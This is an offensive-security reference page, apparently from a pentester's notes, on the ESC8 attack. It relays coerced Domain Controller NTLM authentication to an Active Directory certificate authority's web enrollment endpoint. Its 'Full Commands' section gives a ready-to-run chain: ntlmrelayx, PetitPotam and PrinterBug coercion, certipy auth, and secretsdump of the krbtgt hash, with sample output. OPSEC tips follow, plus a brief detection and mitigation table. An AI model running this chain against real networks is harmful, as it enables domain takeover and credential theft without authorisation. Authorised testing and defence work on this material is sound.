---
title: "Attack #33 — ESC8 NTLM Relay to ADCS HTTP Endpoint"
description: "ESC8 is one of the most impactful ADCS attacks — it enables a full domain compromise from unauthenticated or low-privileged access by combining NTLM…"
category: active-directory
subcategory: "ADCS & Certificates"
tags: ["active-directory", "adcs", "credential-access", "ntlm", "relay"]
tools: ["Impacket", "Certipy"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Four/🟢 Attack #33 — ESC8 NTLM Relay to ADCS HTTP Endpoint.md"
---
# 🟢 Attack #33 — ESC8: NTLM Relay to ADCS HTTP Endpoint

***

## 📖 How It Works

ESC8 is one of the **most impactful ADCS attacks** — it enables a full domain compromise from **unauthenticated or low-privileged access** by combining **NTLM coercion** (PetitPotam, PrinterBug) with **NTLM relay** to the CA's Web Enrollment HTTP endpoint. The attacker coerces a Domain Controller to authenticate, relays that authentication to the CA's HTTP enrollment service, and requests a certificate as the DC machine account — then uses that certificate to DCSync.

### Attack Chain

```
1. Start ntlmrelayx targeting the CA's HTTP enrollment endpoint
2. Coerce DC to authenticate to your listener (PetitPotam/PrinterBug)
3. ntlmrelayx relays DC's NTLM auth to the CA web enrollment
4. CA issues a certificate for the DC machine account
5. Use the DC certificate to authenticate and DCSync
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **CA Web Enrollment enabled (HTTP)** | `/certsrv/` endpoint accessible over HTTP |
| **No EPA (Extended Protection for Auth)** | EPA must be disabled for relay to work |
| **Coercion capability** | PetitPotam, PrinterBug, DFSCoerce, etc. |
| **Network position** | Can reach both DC and CA |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **ntlmrelayx.py** | Linux | `--adcs` flag for certificate enrollment relay |
| **PetitPotam** | Linux | Coerce DC authentication |
| **printerbug.py** | Linux | Alternative coercion |
| **Certipy** | Linux | Relay module for ADCS |
| **Coercer** | Linux | Multi-protocol coercion |

***

## 💻 Full Commands

### 🔴 Full ESC8 Attack

```bash
# ── Step 1: Start ntlmrelayx targeting CA web enrollment ──────────────────────
ntlmrelayx.py -t http://CA01.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# ── Step 2: Coerce DC authentication to your listener ────────────────────────
# PetitPotam (unauthenticated on unpatched):
python3 PetitPotam.py ATTACKER_IP DC01.corp.local

# Or with credentials:
python3 PetitPotam.py -u low_user -p 'Password1' -d corp.local \
  ATTACKER_IP DC01.corp.local

# Or PrinterBug:
printerbug.py corp.local/low_user:'Password1'@DC01.corp.local ATTACKER_IP

# ── ntlmrelayx output: ───────────────────────────────────────────────────────
# [*] SMBD: Received connection from 10.10.10.10
# [*] Relaying to http://CA01.corp.local/certsrv/certfnsh.asp
# [*] Certificate successfully enrolled!
# [*] Base64 certificate: <long_base64_string>

# ── Step 3: Save the base64 certificate ───────────────────────────────────────
echo "<base64_cert>" | base64 -d > dc01.pfx

# ── Step 4: Authenticate with the DC certificate ─────────────────────────────
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10
# Returns DC01$ NT hash

# ── Step 5: DCSync with DC machine hash ───────────────────────────────────────
secretsdump.py corp.local/'DC01$'@DC01.corp.local \
  -hashes :<DC01_NTHASH> -just-dc-user krbtgt
```

### 🔴 Using Certipy Relay Module

```bash
# ── Certipy relay (alternative to ntlmrelayx) ────────────────────────────────
certipy relay -ca CA01.corp.local -template DomainController

# Then coerce with PetitPotam as above
```

***

## 🎯 OPSEC Tips

- **PetitPotam may work unauthenticated** on unpatched DCs — highest impact scenario
- **ESC8 is the quintessential ADCS attack** — shown in every major pentest certification
- **Check for EPA** before attempting — Certipy `find` will report if EPA is enforced
- **The certificate template must be DomainController or Machine** — to get a cert for the DC

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4886** | Security Log (CA) | Certificate enrollment for DC machine account from unexpected source |
| **4768** | Security Log (DC) | PKINIT TGT request from unexpected host |
| **4624** | Security Log (DC) | NTLM logon from unexpected source to CA |

***

## 🔗 Attack Chain Context

```
[ESC8] ──→ NTLM Relay to CA → DC certificate → DCSync → domain compromise
         │
         ├──→ 🖨️ Coerce: PetitPotam (#41) / PrinterBug (#42)
         ├──→ 🩸 DC cert → DCSync → KRBTGT → Golden Ticket
         ├──→ 💥 Potentially unauthenticated full domain compromise
         └──→ 💀 Defeated by: enable EPA, enforce HTTPS, disable web enrollment
```

***

> ✅ **Attack #33 — ESC8 complete.**
